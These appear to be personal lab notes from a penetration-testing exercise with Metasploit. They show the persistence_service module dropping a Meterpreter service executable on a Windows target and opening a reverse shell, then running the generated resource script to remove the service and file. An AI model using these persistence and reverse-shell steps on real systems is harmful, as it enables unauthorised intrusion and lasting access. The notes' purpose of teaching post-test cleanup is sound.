
# Many times when we use Metasploit Post Exploitation modules, these modules leaves many artifacts on the system which after our pentest can be utilised by attacker and can be a risk

# Luckily metasploit modules also gives a `Resource scripts` to us with module execution, consider the post exploitation module of establishing persistence

msf6 exploit(windows/local/persistence_service) > `run`

[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] Running module against ATTACKDEFENSE
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\vgdjb.exe
[*] Creating service spMjX
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc
[*] Sending stage (175174 bytes) to 10.5.31.225
[*] Meterpreter session 2 opened (10.10.26.2:4444 -> 10.5.31.225:49743) at 2024-01-15 17:34:43 +0530

meterpreter > 

# We observe that 

[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\vgdjb.exe

# This is very important thing to know, as this will be left on ststem , we need to clear it manually

# One more thing we see is `Resource Script`, it gave us on our machine

[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc

# If we see this file

root@attackdefense:~# `cat /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc`
execute -H -f sc.exe -a "stop spMjX"
execute -H -f sc.exe -a "delete spMjX"
execute -H -i -f taskkill.exe -a "/f /im vgdjb.exe"
rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\vgdjb.exe"
root@attackdefense:~# 

# This file does exacltly what we want to do, it it removes `vgdjb.exe` from target system after stopping , deleteting  and killing tasks, So now we can simply use this script on target to remove artificats left by post exploitation module

# How to run `Resource Scripts` - in order to run the resource script we simply need to use our current session and a meterpreter command `resource` and the path to file

meterpreter > `resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc`
[*] Processing /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc for ERB directives.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc)> execute -H -f sc.exe -a "stop spMjX"
Process 4076 created.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc)> execute -H -f sc.exe -a "delete spMjX"
Process 4280 created.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc)> execute -H -i -f taskkill.exe -a "/f /im vgdjb.exe"
Process 2392 created.
Channel 2 created.
SUCCESS: The process "vgdjb.exe" with PID 4056 has been terminated.
SUCCESS: The process "vgdjb.exe" with PID 2192 has been terminated.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc)> rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\vgdjb.exe"

# We can see it successfully terminated the process which was created by post exploitation module to maintain the persistence

This is ethical hacking , after our pentest we remove anthing which we left in system

# NOTE - `Always try to understand what metasploit module is doing on Target system` instead of blindly using it